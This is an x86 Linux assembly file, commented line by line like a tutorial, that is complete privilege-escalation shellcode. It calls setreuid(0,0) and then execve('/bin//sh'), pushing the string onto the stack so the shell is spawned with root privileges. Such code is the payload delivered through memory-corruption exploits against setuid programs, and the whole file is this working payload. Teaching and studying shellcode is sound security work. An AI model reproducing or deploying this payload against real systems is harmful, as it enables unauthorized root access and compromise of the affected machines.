section .text	; start the code section of the asm
global _start	; declare a global label
_start:		; get in the habit of using code labels

; setreuid(0,0)
xor eax, eax 	; clear the eax registry, prepare for next line
mov al, 0x46	; set the syscall # to decimal 70 or hex 46, one byte
xor ebx, ebx	; clear the ebx registry
xor ecx, ecx	; clear the ecx registry
int 0x80	; call the kernel to execute the syscall

; spawn shellcode with execve
xor eax, eax 	; clears the eax registry, sets to 0
push eax	; push a NULL value on the stack, value of eax
push 0x68732f2f ; push '//sh' unto the stack, padded with leading '/'
push 0x6e69622f ; push /bin unto the stack, notice strings in reverse
mov ebx, esp 	; since esp now points to "/bin/sh", write to ebx
push eax	; eax is still NULL, let's terminate char ** argv on stack
push ebx	; still need a pointer to the address of '/bin/sh', use ebx
mov ecx, esp	; now esp holds the address of argv, move it to ecx
xor edx, edx	; set edx to zero (NULL), not needed
mov al, 0xb	; set the syscall # to decimal 11 or hex b, one byte
int 0x80	; call the kernel to execute the syscall

